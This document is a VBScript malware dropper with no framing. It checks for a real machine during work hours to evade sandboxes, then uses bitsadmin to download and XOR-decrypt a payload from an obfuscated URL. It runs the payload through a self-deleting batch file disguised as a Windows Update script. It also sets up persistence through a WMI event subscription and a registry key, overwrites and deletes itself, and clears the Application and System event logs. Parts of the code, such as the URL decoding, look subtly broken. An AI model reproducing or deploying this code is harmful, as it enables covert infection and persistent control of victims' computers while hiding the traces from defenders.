'==============================================
'            CORE OBFUSCATION LAYERS
'==============================================

'// --- XOR DECRYPTION FUNCTION --- //
Function XorDecrypt(ciphertext, key)
    Dim output, i, keyChar
    For i = 1 To Len(ciphertext)
        keyChar = Asc(Mid(key, (i Mod Len(key)) + 1, 1))
        output = output & Chr(Asc(Mid(ciphertext, i, 1)) Xor keyChar)
    Next
    XorDecrypt = output
End Function

'// --- ENVIRONMENT VALIDATION --- //
Function IsLegitimateSystem()
    Dim wmi, cpu, mem, gpu, hour
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    
    ' Hardware validation
    Set cpu = wmi.ExecQuery("SELECT * FROM Win32_Processor WHERE LoadPercentage > 10")
    Set mem = wmi.ExecQuery("SELECT * FROM Win32_PhysicalMemory WHERE Capacity > 4000000000")
    Set gpu = wmi.ExecQuery("SELECT * FROM Win32_VideoController WHERE AdapterRAM > 100000000")
    
    ' Time validation
    hour = Hour(Now())
    
    ' Only activate on real systems during work hours
    IsLegitimateSystem = (cpu.Count > 0) And (mem.Count > 0) And (gpu.Count > 0) And _
                         (hour >= 8 And hour <= 18)
End Function

'==============================================
'            POLYMORPHIC ENGINE
'==============================================

Function GenerateJunkCode()
    Dim vars, ops, code
    vars = Array("sys","tmp","obj","cfg","env","var")
    ops = Array("+","-","*","/","And","Or")
    
    Randomize
    For i = 1 To Int(Rnd * 10) + 5
        code = code & "Dim " & vars(Int(Rnd*6)) & Int(Rnd*1000) & ": " & _
               vars(Int(Rnd*6)) & Int(Rnd*1000) & " = " & _
               Int(Rnd*9999) & " " & ops(Int(Rnd*6)) & " " & _
               Int(Rnd*9999) & vbCrLf
    Next
    GenerateJunkCode = code
End Function

'==============================================
'            DELAY SYSTEM (2h23m ±30m)
'==============================================

Sub ExecuteWithRandomDelay(command)
    Dim delayMinutes, wmi, execMethod, execParams
    
    ' Calculate random delay (113-173 minutes)
    delayMinutes = 113 + Int(60 * Rnd())
    
    ' Use WMI for silent delayed execution
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set execMethod = wmi.Get("Win32_Process").Methods_("Create")
    Set execParams = execMethod.InParameters.SpawnInstance_
    
    ' Create command with ping-based delay
    execParams.CommandLine = "%COMSPEC% /b /c ping 127.0.0.1 -n " & (delayMinutes * 60) & _
                           " & " & command
    
    ' Execute with delay
    wmi.ExecMethod "Win32_Process", "Create", execParams
    
    ' Insert junk during wait
    Execute GenerateJunkCode()
End Sub

'==============================================
'            PAYLOAD HANDLING SYSTEM
'==============================================

Sub DownloadExecuteCMD()
    On Error Resume Next
    Dim http, shell, encUrl, tempFile, decryptedCMD
    
    ' XOR-encrypted download URL (Key: "Shadow")
    encUrl = "9C8D9E9B939E8D9C8DDF9A8CDF9E939E8DDF9A8CDF9E939E8D"
    encUrl = XorDecrypt(encUrl, "Shadow")
    
    ' Generate random temp filename
    Set typeLib = CreateObject("Scriptlet.TypeLib")
    tempFile = "%TEMP%\" & Left(typeLib.GUID, 8) & ".dat"
    
    ' Download using BitsAdmin (less monitored)
    Set shell = CreateObject("WScript.Shell")
    shell.Run "bitsadmin /transfer UpdateJob /download /priority low " & _
              encUrl & " " & tempFile, 0, True
    
    ' Read and decrypt in memory
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.LoadFromFile shell.ExpandEnvironmentStrings(tempFile)
    decryptedCMD = XorDecrypt(BytesToString(stream.Read), "CmdKey")
    
    ' Execute via temporary self-deleting batch
    ExecuteTempBatch decryptedCMD
    
    ' Cleanup encrypted file
    fso.DeleteFile shell.ExpandEnvironmentStrings(tempFile)
End Sub

Sub ExecuteTempBatch(cmdContent)
    Dim fso, shell, tempPath, batchContent
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    
    ' Create random batch filename
    Set typeLib = CreateObject("Scriptlet.TypeLib")
    tempPath = "%TEMP%\" & Left(typeLib.GUID, 8) & ".cmd"
    tempPath = shell.ExpandEnvironmentStrings(tempPath)
    
    ' Add self-destruct mechanism
    batchContent = "@echo off" & vbCrLf & _
                   "REM Windows Update Post-Install Script" & vbCrLf & _
                   cmdContent & vbCrLf & _
                   "timeout /t 3 /nobreak >nul" & vbCrLf & _
                   "del /f /q """ & tempPath & """"
    
    ' Write and execute
    fso.CreateTextFile(tempPath).Write batchContent
    shell.Run """" & tempPath & """", 0, False
End Sub

'==============================================
'            PERSISTENCE MECHANISMS
'==============================================

Sub SetStealthPersistence()
    Dim shell, wmi, filter, consumer, binding
    
    Set shell = CreateObject("WScript.Shell")
    Set wmi = GetObject("winmgmts:\\.\root\subscription")
    
    ' WMI Event Subscription
    Set filter = wmi.Get("__EventFilter").SpawnInstance_
    filter.Name = "SystemMonitor_" & Int(Rnd * 10000)
    filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE " & _
                  "TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
    filter.Put_
    
    Set consumer = wmi.Get("ActiveScriptEventConsumer").SpawnInstance_
    consumer.Name = "SysConsumer_" & Int(Rnd * 10000)
    consumer.ScriptingEngine = "VBScript"
    consumer.ScriptText = "Set obj = CreateObject(""WScript.Shell""): obj.Run ""%TEMP%\WinUpdate.cmd"", 0, False"
    consumer.Put_
    
    ' Registry Persistence (Less monitored location)
    shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Update", "%TEMP%\WinUpdate.cmd", "REG_SZ"
End Sub

'==============================================
'            CLEANUP SYSTEM
'==============================================

Sub AdvancedCleanup()
    Dim fso, shell, wmi
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    
    ' Overwrite script before deletion
    fso.OpenTextFile(WScript.ScriptFullName, 2).Write String(5000, "X")
    
    ' Delete with delay
    Set objMethod = wmi.Get("Win32_Process").Methods_("Create")
    Set objParams = objMethod.InParameters.SpawnInstance_
    objParams.CommandLine = "cmd /c ping 127.0.0.1 -n 30 & del """ & WScript.ScriptFullName & """"
    wmi.ExecMethod "Win32_Process", "Create", objParams
    
    ' Clear relevant event logs
    shell.Run "wevtutil cl Application", 0, True
    shell.Run "wevtutil cl System", 0, True
End Sub

'==============================================
'            HELPER FUNCTIONS
'==============================================

Function BytesToString(bytes)
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write bytes
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "utf-8"
    BytesToString = stream.ReadText
    stream.Close
End Function

'==============================================
'            MAIN EXECUTION FLOW
'==============================================

' Insert initial junk code
Execute GenerateJunkCode()

If IsLegitimateSystem() Then
    ' Stage 1: Download CMD payload (immediate)
    DownloadExecuteCMD()
    
    ' Stage 2: Set persistence (delayed 113-173 min)
    ExecuteWithRandomDelay("wscript.exe //e:vbscript """ & WScript.ScriptFullName & """ /persist")
    
    ' Stage 3: Cleanup (delayed 113-173 min)
    ExecuteWithRandomDelay("wscript.exe //e:vbscript """ & WScript.ScriptFullName & """ /clean")
End If

' Handle stage-specific execution
If WScript.Arguments.Named.Exists("persist") Then
    SetStealthPersistence()
ElseIf WScript.Arguments.Named.Exists("clean") Then
    AdvancedCleanup()
End If

' Insert final junk code
Execute GenerateJunkCode()